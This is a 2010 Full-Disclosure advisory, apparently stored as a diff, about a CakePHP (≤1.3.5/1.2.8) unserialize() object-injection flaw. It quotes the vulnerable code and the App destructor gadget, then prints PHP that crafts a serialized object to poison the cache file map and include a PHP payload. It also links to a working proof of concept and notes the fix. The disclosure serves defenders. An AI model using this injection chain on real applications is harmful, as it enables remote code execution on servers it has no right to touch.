@@ -1,0 +1,125 @@
+
+Date: Sun, 14 Nov 2010 21:57:19 +0100
+From: Felix <felix@...loc.im>
+To: full-disclosure@...ts.grok.org.uk
+Subject: CakePHP <= 1.3.5 / 1.2.8 unserialize()
+	Vulnerability
+
+CakePHP <= 1.3.5 / 1.2.8 unserialize() Vulnerability
+                             felix |at| malloc.im                
+===============================================================================
+
+Overview:
+
+
+"CakePHP is a rapid development framework for PHP that provides an
+extensible
+architecture for developing, maintaining, and deploying applications.
+Using
+commonly known design patterns like MVC and ORM within the convention
+over
+configuration paradigm, CakePHP reduces development costs and helps
+developers
+write less code." - cakephp.org 
+
+
+CakePHP is vulnerable to a file inclusion attack because of its use of
+the
+"unserialize()" function on unchecked user input. This makes it possible
+to inject arbitary objects into the scope.
+
+Details:
+
+CakePHP uses the following function in the Security component
+to protect against XSRF attacks with POST Requests:
+
+function _validatePost(&$controller) {
+    -- snip --  
+	$check = $controller->data;
+	$token = urldecode($check['_Token']['fields']);
+                                                                                                          
+	if (strpos($token, ':')) {
+		list($token, $locked) = explode(':', $token, 2);
+	}
+                                                                                                          
+	$locked = unserialize(str_rot13($locked));
+    -- snip --
+
+The $check array contains our POST data and $locked is
+a simple (rot-13 obfuscated) serialized string, which is completely
+under our control.
+
+PHP5 introduces a destructor with the "__destruct" method. Each object
+will execute its __destruct method at the end of its lifetime and we can
+use this to turn an unchecked unserialize() call in an useful exploit.
+(See Stefan Essers talk @ 
+http://www.suspekt.org/downloads/POC2009-ShockingNewsInPHPExploitation.pdf
+for more information)
+
+CakePHP defines the App Class with the following destruct method:
+
+function __destruct() {
+    if ($this->__cache) {
+        $core = App::core('cake');
+        unset($this->__paths[rtrim($core[0], DS)]);
+        Cache::write('dir_map', array_filter($this->__paths),
+'_cake_core_');
+        Cache::write('file_map', array_filter($this->__map),
+'_cake_core_');
+        Cache::write('object_map', $this->__objects, '_cake_core_');
+    }
+	}
+
+As we can see, this method can be abused by an manipulated object to
+write
+arbitary values into the _cake_core Cache.
+
+The most interesting key to corrupt is the file_map. It provides the
+mapping between Classes and PHP Files and is used to load additional
+Classes at runtime. 
+The real code for the loading of classes is a bit complicated but it all
+boils down to the following code in the __load method inside the App
+class:
+
+if (file_exists($file)) {
+			if (!$this->return) {
+				require($file);
+
+				$this->__loaded[$file] = true;
+			}
+			return true;
+
+This means we can execute arbitary files on the local filesystem.
+CakePHP uses a file based caching system in its standard configuration,
+and the cache data is written in serialized form to a known location.
+
+We can use this information to create a create a manipulated App object
+that executes our PHP Payload:
+
+$x=new App();
+$x->__cache=1;
+$x->__map=array("Core" => array("Router" 
+                    => "../tmp/cache/persistent/cake_core_file_map"),
+                "Foo" => "<? phpinfo(); exit(); ?>");
+$x->__paths=array();
+$x->__objects=array();
+echo serialize($x);
+
+
+POC:
+
+See http://malloc.im/burnedcake.py for a working POC exploit.
+
+
+Patch:
+
+This bug was patched in Version 1.3.6 and 1.2.9.
+
+
+
+
+
+_______________________________________________
+Full-Disclosure - We believe in it.
+Charter: http://lists.grok.org.uk/full-disclosure-charter.html
+Hosted and sponsored by Secunia - http://secunia.com/
